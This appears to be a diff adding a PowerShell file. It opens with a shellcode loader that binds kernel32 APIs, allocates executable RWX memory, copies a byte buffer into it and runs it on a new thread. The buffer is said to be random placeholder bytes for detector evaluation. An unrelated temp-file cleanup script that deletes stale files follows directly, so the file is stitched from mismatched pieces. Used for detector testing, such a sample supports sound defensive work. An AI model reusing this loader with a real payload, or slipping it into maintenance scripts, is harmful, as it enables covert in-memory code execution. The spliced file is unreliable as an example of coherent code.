@@ -1,0 +1,133 @@
+
+<#
+.SYNOPSIS
+    Loads a prepared binary buffer into committed memory and starts it
+    on a worker thread.
+
+.DESCRIPTION
+    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
+    into it, starts a thread and waits for completion. The buffer is a
+    placeholder supplied for static-analysis exercises.
+
+.NOTES
+    Sample generated for detector evaluation. No real payload is used.
+#>
+
+$LogPath = "$env:TEMP\stage.log"
+
+try {
+    $NativeCode = @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public static class NativeApi
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+            uint dwFreeType);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+            uint dwCreationFlags, out uint lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+    }
+    "@
+
+    Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
+    $Buffer = [Byte[]] @(
+        0x35, 0x0d, 0xd2, 0x70, 0x99, 0xc9, 0x65, 0x72, 0x14, 0xa9, 0x03, 0x60, 0x28, 0x4b, 0x7e, 0xcc,
+        0xbc, 0xfa, 0xdc, 0xd4, 0xc7, 0x43, 0xd7, 0xae, 0xfa, 0x90, 0x3e, 0x26, 0x2b, 0x2a, 0x99, 0xcb,
+        0xd4, 0x45, 0x70, 0xaa, 0x01, 0x72, 0x13, 0xa4, 0xb8, 0x6e, 0x80, 0x18, 0x53, 0x94, 0x98, 0xbd,
+        0x7c, 0x48, 0x5d, 0x63, 0xa7, 0xe4, 0x0a, 0xa7, 0xd4, 0xe6, 0x09, 0x67, 0x2c, 0xa7, 0xed, 0xab,
+        0x18, 0x53, 0xe0, 0x31, 0x34, 0x98, 0x5a, 0x6a, 0xbc, 0x97, 0xde, 0x06, 0x47, 0x15, 0xb4, 0xd0,
+        0xd8, 0x9c, 0x41, 0xbd, 0xa8, 0x5f, 0xef, 0x4f, 0x11, 0xc2, 0x3f, 0xbf, 0x89, 0x1a, 0x77, 0xee,
+        0x58, 0xa7, 0x59, 0x63, 0x5b, 0x01, 0x8e, 0x4c, 0x0f, 0xc0, 0x6a, 0xaa, 0x4d, 0x3f, 0x4a, 0x1b,
+        0xa3, 0xe7, 0x60, 0x77, 0x5f, 0x1a, 0xfb, 0x23, 0xbe, 0x20, 0x7b, 0xaa, 0x4e, 0x45, 0x0e, 0x0f,
+        0x1d, 0x3c, 0xa7, 0x5c, 0x19, 0x66, 0x7d, 0x23, 0x69, 0x42, 0x1a, 0xcf, 0x74, 0xb0, 0x8c, 0x1e,
+        0xe4, 0xb0, 0x0f, 0xa5, 0x02, 0xc9, 0x97, 0xcb, 0x61, 0x3a, 0x62, 0x69, 0x52, 0x04, 0x39, 0x42,
+        0x17, 0xb6, 0x3e, 0xaf, 0xee, 0xb3, 0x7f, 0x55, 0xb7, 0x2f, 0x38, 0x6e, 0x4c, 0xfc, 0xa2, 0xcf,
+        0x35, 0xf2, 0xb6, 0xc3, 0x04, 0x47, 0xd0, 0xa4, 0xe4, 0x73, 0x68, 0x65, 0xe0
+    )
+
+    $BufferAddress = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+    if ($BufferAddress -eq [IntPtr]::Zero) {
+        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        return
+    }
+
+    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
+    $ThreadId = 0
+    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
+    [void][NativeApi]::WaitForSingleObject($Thread, 1412)
+    [void][NativeApi]::CloseHandle($Thread)
+
+    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
+}
+catch {
+    Write-Warning "loader failed: $($_.Exception.Message)"
+}
+$TempRoot = $env:TEMP
+$AgeDays = 7
+$MinSizeMB = 5
+$LogPath = 'C:\Logs\temp-cleanup-2026-07-26.log'
+$DryRun = $false
+
+$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
+$culture = [System.Globalization.CultureInfo]::InvariantCulture
+$WarningPreference = 'Continue'
+
+if (-not (Test-Path -LiteralPath $TempRoot)) {
+    throw ("Temp path not found: {0}" -f $TempRoot)
+}
+$cutoff = (Get-Date).AddDays(-$AgeDays)
+$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
+$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
+$stale = $allFiles | Where-Object {
+    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
+}
+$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
+Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan
+
+foreach ($file in $stale) {
+    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
+        continue
+    }
+    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
+}
+$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
+    Measure-Object -Property Length -Sum).Sum / 1MB, 1)
+
+Write-Host ("After cleanup: {0} MB" -f $remainingMB) -ForegroundColor Green
+$line = "{0} reclaimed {1} MB from {2} files" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $reclaimMB, @($stale).Count
+Add-Content -Path $LogPath -Value $line -Encoding UTF8
+
+$psVersion = $PSVersionTable.PSVersion
+Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
+Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
+
+$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
+Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8
+
+$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isElevated) {
+    Write-Warning 'Some checks require an elevated session.'
+}
+
+$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
+    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
+foreach ($dir in $staleTemp) {
+    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
+}
